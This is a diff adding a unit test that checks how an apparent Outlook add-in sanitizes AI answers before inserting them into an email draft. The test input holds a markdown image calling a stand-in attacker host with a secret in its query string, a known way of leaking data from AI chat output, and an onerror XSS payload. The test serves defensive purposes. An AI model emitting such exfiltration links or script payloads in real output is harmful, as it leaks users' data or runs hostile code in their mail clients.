@@ -191,6 +191,24 @@ describe('insert', () => {
     expect(item.body.prependAsync).not.toHaveBeenCalled();
   });
 
+  test('sanitizes the answer like the chat does: no image from another host in the draft', async () => {
+    const m = loadModule();
+    const item = composeModeItem();
+    installOffice({ item });
+
+    await m.runOutlookMailAction(
+      'insert',
+      'Summary ![t](https://evil.example/p.png?d=secret) <img src=x onerror=alert(1)>'
+    );
+
+    const [html] = item.body.setSelectedDataAsync.mock.calls[0];
+    expect(html).toContain('Summary');
+    expect(html).not.toMatch(/<img[^>]+evil\.example/);
+    expect(html).not.toContain('onerror');
+    // The picture is still reachable, as a link.
+    expect(html).toContain('href="https://evil.example/p.png?d=secret"');
+  });
+
   test('falls back to prepending when there is no insertion point', async () => {
     const m = loadModule();
     const item = composeModeItem({
